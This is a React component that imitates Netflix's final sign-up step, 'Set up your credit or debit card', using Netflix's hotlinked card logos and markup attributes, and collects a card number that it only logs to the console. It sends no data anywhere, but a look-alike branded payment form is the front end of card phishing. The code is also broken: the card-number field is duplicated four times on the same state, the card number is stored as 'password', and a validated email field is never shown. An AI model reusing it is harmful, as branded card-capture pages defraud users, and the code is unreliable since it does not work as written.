import React, { useState } from 'react';

function CardInput() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState({});
  const [emailFocused, setEmailFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [hover, setHover] = useState(false);
  const [showInfo, setShowInfo] = useState(false);
  const [isHovered, setIsHovered] = useState(false);
  const [isHoveredCode, setIsHoveredCode] = useState(false);



  const validateField = (field) => {
    const newErrors = { ...errors };

    if (field === 'email') {
      if (!/\S+@\S+\.\S+/.test(email)) {
        newErrors.email = 'Please enter a valid email.';
      } else {
        delete newErrors.email;
      }
    }

    if (field === 'password') {
      if (password.length < 4 || password.length > 60) {
        newErrors.password = 'Please enter a card number.';
      } else {
        delete newErrors.password;
      }
    }

    setErrors(newErrors);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    validateField('email');
    validateField('password');

    if (Object.keys(errors).length === 0) {
      console.log('Submit', { email, password });
    }
  };

  const isEmailActive = emailFocused || email !== '';
  const isPasswordActive = passwordFocused || password !== '';

  return (
    <div>
      <span
        style={{
          fontSize: '13px',
          textAlign: 'left',
          lineHeight: '19px',
          display: 'block',
          color: '#333',
        }}
      >
        STEP 3 OF 3
      </span>
      <h1 style={{ color: 'black' }}>Set up your credit or debit card</h1>

      <span
        data-uia="cardLogos-comp"
        aria-label="We accept Visa, Mastercard and American Express."
      >
        <img
          src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA.png"
          alt="Visa"
          className="logoIcon VISA default-ltr-cache-kg1rox e18ygst00"
          srcSet="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA@2x.png 2x"
          data-uia="logoIcon-VISA"
        />
        <img
          src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD.png"
          alt="Mastercard"
          className="logoIcon MASTERCARD default-ltr-cache-kg1rox e18ygst00"
          srcSet="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD@2x.png 2x"
          data-uia="logoIcon-MASTERCARD"
        />
        <img
          src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX.png"
          alt="American Express"
          className="logoIcon AMEX default-ltr-cache-kg1rox e18ygst00"
          srcSet="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX@2x.png 2x"
          data-uia="logoIcon-AMEX"
        />
      </span>
      
      <div style={{ position: "relative", marginBottom: errors.password ? 4 : 16 }}>
            <input
              type="tel"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onFocus={() => setPasswordFocused(true)}
              onBlur={() => {
                setPasswordFocused(false);
                validateField('password');
              }}
              style={{
                height: 24,
                borderRadius: 4,
                border: errors.password ? '1px solid #eb3942' : 'none',
                color: "black",
                fontSize: 16,
                width: 290,
                padding: "24px 16px 8px 16px  ",
                border: "#63666a 1px solid",
                background: "white",
              }}
            />
            <label style={{
              position: "absolute",
              left: 16,
              top: isPasswordActive ? 6 : 16,
              fontSize: isPasswordActive ? 12 : 16,
              color: "#8c8c8c",
              transition: "all 0.2s ease",
              pointerEvents: "none"
            }}>
              Card number
            </label>
          </div>
          {errors.password && (
            <div style={{ color: "#c63937", fontSize: 14, marginBottom: 16 }}>
              <svg   xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CircleXSmall" aria-hidden="true" >
              <path fill="currentColor" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" clipRule="evenodd" fillRule="evenodd"></path>

</svg> {errors.password}
            </div>
          )}
                <div style={{ position: "relative", marginBottom: errors.password ? 4 : 16 }}>
            <input
              type="tel"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onFocus={() => setPasswordFocused(true)}
              onBlur={() => {
                setPasswordFocused(false);
                validateField('password');
              }}
              style={{
                height: 24,
                borderRadius: 4,
                border: errors.password ? '1px solid #eb3942' : 'none',
                color: "black",
                fontSize: 16,
                width: 290,
                padding: "24px 16px 8px 16px  ",
                border: "#63666a 1px solid",
                background: "white",
              }}
            />
            <label style={{
              position: "absolute",
              left: 16,
              top: isPasswordActive ? 6 : 16,
              fontSize: isPasswordActive ? 12 : 16,
              color: "#8c8c8c",
              transition: "all 0.2s ease",
              pointerEvents: "none"
            }}>
              Card number
            </label>
          </div>
          {errors.password && (
            <div style={{ color: "#c63937", fontSize: 14, marginBottom: 16 }}>
              <svg   xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CircleXSmall" aria-hidden="true" >
              <path fill="currentColor" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" clipRule="evenodd" fillRule="evenodd"></path>

</svg> {errors.password}
            </div>
          )}
                <div style={{ position: "relative", marginBottom: errors.password ? 4 : 16 }}>
            <input
              type="tel"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onFocus={() => setPasswordFocused(true)}
              onBlur={() => {
                setPasswordFocused(false);
                validateField('password');
              }}
              style={{
                height: 24,
                borderRadius: 4,
                border: errors.password ? '1px solid #eb3942' : 'none',
                color: "black",
                fontSize: 16,
                width: 290,
                padding: "24px 16px 8px 16px  ",
                border: "#63666a 1px solid",
                background: "white",
              }}
            />
            <label style={{
              position: "absolute",
              left: 16,
              top: isPasswordActive ? 6 : 16,
              fontSize: isPasswordActive ? 12 : 16,
              color: "#8c8c8c",
              transition: "all 0.2s ease",
              pointerEvents: "none"
            }}>
              Card number
            </label>
          </div>
          {errors.password && (
            <div style={{ color: "#c63937", fontSize: 14, marginBottom: 16 }}>
              <svg   xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CircleXSmall" aria-hidden="true" >
              <path fill="currentColor" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" clipRule="evenodd" fillRule="evenodd"></path>

</svg> {errors.password}
            </div>
          )}
                <div style={{ position: "relative", marginBottom: errors.password ? 4 : 16 }}>
            <input
              type="tel"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onFocus={() => setPasswordFocused(true)}
              onBlur={() => {
                setPasswordFocused(false);
                validateField('password');
              }}
              style={{
                height: 24,
                borderRadius: 4,
                border: errors.password ? '1px solid #eb3942' : 'none',
                color: "black",
                fontSize: 16,
                width: 290,
                padding: "24px 16px 8px 16px  ",
                border: "#63666a 1px solid",
                background: "white",
              }}
            />
            <label style={{
              position: "absolute",
              left: 16,
              top: isPasswordActive ? 6 : 16,
              fontSize: isPasswordActive ? 12 : 16,
              color: "#8c8c8c",
              transition: "all 0.2s ease",
              pointerEvents: "none"
            }}>
              Card number
            </label>
          </div>
          {errors.password && (
            <div style={{ color: "#c63937", fontSize: 14, marginBottom: 16 }}>
              <svg   xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CircleXSmall" aria-hidden="true" >
              <path fill="currentColor" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" clipRule="evenodd" fillRule="evenodd"></path>

</svg> {errors.password}
            </div>
          )}
          
    </div>
  );
}

export default CardInput;
